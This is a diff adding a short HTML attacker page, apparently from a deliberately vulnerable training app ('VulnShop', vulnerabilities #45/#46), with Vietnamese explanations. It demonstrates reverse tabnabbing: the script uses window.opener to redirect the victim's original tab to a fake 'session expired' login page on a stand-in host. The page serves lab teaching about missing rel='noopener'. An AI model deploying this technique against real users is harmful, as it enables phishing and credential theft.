@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Tabnabbing / Reverse Tabnabbing attacker (#45/#46)</title>
+    <style>
+      body { background: #0d1117; color: #e6edf3; font-family: system-ui; padding: 20px; }
+      .phish { background: #1f6feb; display: inline-block; padding: 10px 16px; border-radius: 8px; }
+    </style>
+  </head>
+  <body>
+    <h1>Tabnabbing attacker page</h1>
+    <p>
+      Trang VulnShop có link <code>target="_blank"</code> <b>không có</b>
+      <code>rel="noopener noreferrer"</code> → tab mở từ link giữ reference
+      <code>window.opener</code> về trang gốc. Trang này exploit nó:
+    </p>
+    <button class="phish" onclick="hijack()">Hijack opener now</button>
+    <pre id="out"></pre>
+    <script>
+      function hijack() {
+        if (window.opener) {
+          // [VULN #45/#46] rewrite the ORIGINAL tab (phish) while user stays here
+          window.opener.location = "https://example.com/session-expired-please-relogin";
+          document.getElementById("out").textContent =
+            "Đã đổi URL tab gốc thành trang fake 'session expired'. " +
+            "Người dùng quay lại tab cũ sẽ thấy trang login giả mạo.";
+        } else {
+          document.getElementById("out").textContent =
+            "Không có window.opener (tab này được mở trực tiếp hoặc với rel=noopener).";
+        }
+      }
+    </script>
+  </body>
+</html>
